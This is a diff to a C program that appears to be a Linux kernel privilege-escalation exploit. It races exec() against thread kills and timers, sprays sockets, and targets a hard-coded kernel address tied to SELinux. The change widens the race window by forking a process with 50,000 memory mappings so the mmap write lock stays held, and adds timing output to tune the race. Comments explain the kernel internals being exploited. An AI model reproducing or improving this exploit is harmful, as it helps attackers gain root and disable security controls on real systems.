@@ -19,6 +19,7 @@
 #include <sys/wait.h>
 #include <sys/syscall.h>
 #include <sched.h>
+#include <time.h>
 
 #define T "/sys/kernel/tracing"
 #define NVMA 50000
@@ -27,7 +28,7 @@
 #define MAX_SOCKS 6000
 #define SELINUX_MINUS7 0xffffffd642759629ULL
 
-static struct shared { _Atomic int helpers[8]; _Atomic int nhelpers; } *g_sh;
+static struct shared { _Atomic int helpers[8]; _Atomic int nhelpers; _Atomic long go_ns, exec_ns, kill_ns, mprot_ns; } *g_sh;
 static _Atomic int g_exec_tid, g_stop, g_go, g_in_mprotect, g_spray_stop;
 static void *g_vmas; static size_t g_vmalen; static int g_vmafd;
 static int g_socks[MAX_SOCKS][2]; static int g_nsocks;
@@ -53,15 +54,40 @@ static int prepare_vmas(void)
     }
     return 0;
 }
-static int locker_fn(void *arg) { int prot = PROT_NONE; (void)arg;
+static int locker_fn(void *arg)
+{
+    (void)arg;
     while (!atomic_load(&g_go)) { if (atomic_load(&g_stop)) return 0; sched_yield(); }
-    while (!atomic_load(&g_stop)) { atomic_store(&g_in_mprotect, 1); mprotect(g_vmas, g_vmalen, prot); atomic_store(&g_in_mprotect, 0); prot = (prot == PROT_NONE) ? PROT_READ : PROT_NONE; }
-    return 0; }
+    if (g_sh) { struct timespec t0; clock_gettime(CLOCK_MONOTONIC, &t0);
+        atomic_store(&g_sh->go_ns, (long)t0.tv_sec * 1000000000L + t0.tv_nsec); }
+    /* dup_mmap() walks every VMA while holding mmap_write_lock, so forking a
+     * 50k-VMA process keeps the write lock busy for milliseconds. That is what
+     * gives exec_mmap()'s down_read_killable something to block on. */
+    while (!atomic_load(&g_stop)) {
+        struct timespec a, b;
+        pid_t p;
+        clock_gettime(CLOCK_MONOTONIC, &a);
+        atomic_store(&g_in_mprotect, 1);
+        p = fork();
+        if (p == 0) _exit(0);
+        if (p > 0) { int st; waitpid(p, &st, 0); }
+        clock_gettime(CLOCK_MONOTONIC, &b);
+        atomic_store(&g_in_mprotect, 0);
+        if (g_sh) atomic_store(&g_sh->mprot_ns,
+            ((long)b.tv_sec - a.tv_sec) * 1000000000L + (b.tv_nsec - a.tv_nsec));
+    }
+    return 0;
+}
+
 static int killer_fn(void *arg)
 {
     int tgid = (int)(intptr_t)arg; int old; pin_cpu(2);
     while (!(old = atomic_load(&g_exec_tid))) { if (atomic_load(&g_stop)) return 0; sched_yield(); }
     for (;;) { if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH) break; if (atomic_load(&g_stop)) return 0; }
+    {
+        struct timespec tk; clock_gettime(CLOCK_MONOTONIC, &tk);
+        if (g_sh) atomic_store(&g_sh->kill_ns, (long)tk.tv_sec * 1000000000L + tk.tv_nsec);
+    }
     {
         /* exchange_tids() runs in de_thread(), i.e. BEFORE exec_mmap(). Firing
          * immediately therefore lands before the window; wait a little so the
@@ -92,6 +118,11 @@ static void *exec_fn(void *arg)
     for (i = 0; i < N_TIMERS; i++) {
         if (timer_create(CLOCK_THREAD_CPUTIME_ID, i == ARMED ? &ae : &plain, &many[i])) _exit(120);
         if (i == ARMED && timer_settime(many[i], 0, &sp, NULL)) _exit(120);
+    }
+    {
+        struct timespec ts;
+        clock_gettime(CLOCK_MONOTONIC, &ts);
+        if (g_sh) atomic_store(&g_sh->exec_ns, (long)ts.tv_sec * 1000000000L + ts.tv_nsec);
     }
     atomic_store(&g_exec_tid, (int)syscall(SYS_gettid));
     atomic_store(&g_go, 1);
@@ -235,7 +266,11 @@ int main(int argc, char **argv)
             killed++;
             wf(T "/tracing_on", "0\n");
             hit = count_hits();
-            printf("  round %d: zombie status=%d sockets=%d\n", i, st, g_nsocks); fflush(stdout);
+            printf("  round %d: zombie status=%d sockets=%d  exec->kill=%ldus  go->kill=%ldus  mprotect=%ldus\n",
+                   i, st, g_nsocks,
+                   (atomic_load(&g_sh->kill_ns) - atomic_load(&g_sh->exec_ns)) / 1000,
+                   (atomic_load(&g_sh->kill_ns) - atomic_load(&g_sh->go_ns)) / 1000,
+                   atomic_load(&g_sh->mprot_ns) > 0 ? atomic_load(&g_sh->mprot_ns) / 1000 : atomic_load(&g_sh->mprot_ns)); fflush(stdout);
             if (hit > 0) {
                 claimed++;
                 { int s2; waitpid(child, &s2, 0); }
